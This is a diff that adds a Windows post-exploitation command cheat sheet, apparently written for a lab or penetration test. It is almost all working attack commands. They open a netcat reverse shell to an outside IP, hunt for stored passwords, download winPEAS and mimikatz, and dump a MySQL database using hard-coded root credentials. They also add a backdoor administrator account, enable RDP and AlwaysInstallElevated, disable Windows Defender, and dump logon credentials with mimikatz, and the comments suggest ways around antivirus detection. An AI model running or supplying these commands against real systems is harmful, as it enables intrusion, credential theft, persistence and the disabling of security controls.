@@ -1,0 +1,89 @@
+#shell back on a seperate process as this php shell could die
+start /B c:\windows\temp\nc.exe 192.168.2.145 1338 -e cmd.exe
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+# ideally run a C2 covy, empire or cs connection
+mkdir c:\windows\temp\hax0r\
+whoami /all
+wmic product get name,version
+wmic /output:C:\windows\temp\InstallList.csv product get /format:csv.xsl
+netstat -ano
+netstat -ant
+schtasks /query /fo LIST /v
+findstr /si password *.txt
+findstr /si password *.xml
+findstr /si password *.ini
+
+dir *pass*.xls*
+dir /s *pass* == *cred* == *vnc* == *.config*
+findstr /spin "password" *.*
+findstr /spin "user" *.*
+findstr /spin "sql" *.*
+
+schtasks /query /fo LIST /v | findstr web
+schtasks /query /fo LIST /v | findstr backup
+schtasks /query /fo LIST /v | findstr sql
+schtasks /query /fo LIST /v | findstr database
+
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+
+C:\Users\All Users\MySQL\MySQL Server 5.7\my.ini
+
+
+
+powershell -nop -ep bypass -command { Invoke-WebRequest -Uri "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat" -outfile c:\windows\temp\hax0r\en.bat  }
+
+
+cd "c:\Program Files\MySQL\MySQL Server 5.7\bin"
+"c:\Program Files\MySQL\MySQL Server 5.7\bin\mysqldump.exe" --user=root --password=Pa55w0rd1 --host=localhost --port=3306 --result-file="c:\windows\temp\kittenf_db.sql" --databases "kitten_db"
+
+"c:\Program Files\MySQL\MySQL Server 5.7\bin\mysql.exe" --user=root --password=Pa55w0rd1 --host=localhost --port=3306 --database="sys" --execute="show tables;"
+
+
+"c:\Program Files\MySQL\MySQL Server 5.7\bin\mysql.exe" --user=root --password=Pa55w0rd1 --host=localhost --port=3306 --database="mysql" --execute="show tables;"
+
+"c:\Program Files\MySQL\MySQL Server 5.7\bin\mysql.exe" --user=root --password=Pa55w0rd1 --host=localhost --port=3306 --database="mysql" --execute="select * from user;"
+
+"c:\Program Files\MySQL\MySQL Server 5.7\bin\mysql.exe" --user=root --password=Pa55w0rd1 --host=localhost --port=3306 --database="kitten_db" --execute="show tables;"
+
+"c:\Program Files\MySQL\MySQL Server 5.7\bin\mysql.exe" --user=root --password=Pa55w0rd1 --host=localhost --port=3306 --database="kitten_db" --execute="select * from users;"
+
+
+
+powershell -nop -ep bypass -command $u='.\JohnSmith';$p='Pa55w0rd1';$c=convertTo-SecureString -AsPlainText -Force $p;$c=new-object system.management.automation.pscredential($u,$c);Invoke-Command -ComputerName 127.0.0.1 -Credential $c -ScriptBlock { whoami  }
+
+powershell -nop -ep bypass -command $u='.\JohnSmith';$p='Pa55w0rd1';$c=convertTo-SecureString -AsPlainText -Force $p;$c=new-object system.management.automation.pscredential($u,$c);Invoke-Command -ComputerName 127.0.0.1 -Credential $c -ScriptBlock {"c:\windows\temp\nc.exe 192.168.2.145 1338 -e cmd.exe"}
+
+
+net user /add hax0rman hax0rMan9000!
+net localgroup administrators hax0rman /add
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+
+Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealTimeMonitoring /t REG_DWORD /d 1 /f
+
+Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+
+
+
+# or via Powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+#ok so doing that stands out alot.. why not just create exlcusions ;)
+
+Invoke-WebRequest https://raw.githubusercontent.com/mr-r3b00t/mimihamster/master/x64/mimikatz.exe -O c:\windows\temp\hax0r\mimikatz.exe
+
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+
+./mimikatz.exe log version debug "sekurlsa::logonpasswords full" sekurlsa::logonPasswords exit
+
+
+############################## BITS PSH MODS GETS SCANNED WITH AMSI#####################
+Start-BitsTransfer -Source "https://raw.githubusercontent.com/mr-r3b00t/mimihamster/master/x64/mimikatz.exe" -Destination c:\windows\temp\hax0r\mimikatz.exe
+
+powershell -nop -ep bypass -Command {Start-BitsTransfer -Source "https://raw.githubusercontent.com/mr-r3b00t/mimihamster/master/x64/mimikatz.exe" -Destination c:\windows\temp\hax0r\mimikatz.exe}
